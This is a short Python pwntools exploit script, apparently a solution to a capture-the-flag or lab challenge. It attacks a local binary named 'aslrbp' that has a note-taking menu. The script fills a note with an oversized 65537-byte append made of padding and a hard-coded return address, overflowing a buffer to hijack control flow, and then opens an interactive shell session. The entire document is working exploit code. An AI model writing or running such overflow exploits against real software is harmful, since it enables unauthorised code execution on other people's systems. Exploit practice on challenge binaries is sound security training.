from pwn import *

context.log_level = "DEBUG"
p = process(["./aslrbp", "./4"])

payload = b"A"*68 + p64(0x1000006f4)
payload  = payload.ljust(65537, b"B") 

p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"note capacity (1-64): ", b"2")
p.sendlineafter(b"initial content length: ", b"0")
p.sendlineafter(b"> ", b"2")
p.sendlineafter(b"index: ", b"0")
p.sendlineafter(b"append length: ", b"65537")
p.sendlineafter(b"send 65537 bytes:", payload)
p.sendlineafter(b"> ", b"3")
p.sendlineafter(b"index: ", b"0")

p.interactive()
